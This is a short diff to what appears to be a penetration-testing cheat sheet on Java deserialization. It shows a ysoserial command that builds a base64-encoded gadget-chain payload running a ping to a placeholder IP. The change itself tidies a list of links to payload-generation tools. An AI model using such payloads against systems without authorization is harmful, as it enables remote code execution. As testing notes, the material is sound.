@@ -34,8 +34,7 @@ base64 encoded:
 `java -jar ysoserial-master-30099844c6-1.jar <Gadget> "ping <your ip>" | base64 > payload.txt`
 
 8. How to autonomate payload generation ?
- 
-https://github.com/ElusiveFoxie/Python-Bash_Deserialisation/
-
-burp useful plugin:
-https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae
+- my scripts: https://github.com/ElusiveFoxie/Python-Bash_Deserialisation/
+- burp useful plugin: https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae
+- gadgeInspector: https://github.com/JackOfMostTrades/gadgetinspector
+- ysoserial: https://github.com/frohoff/ysoserial
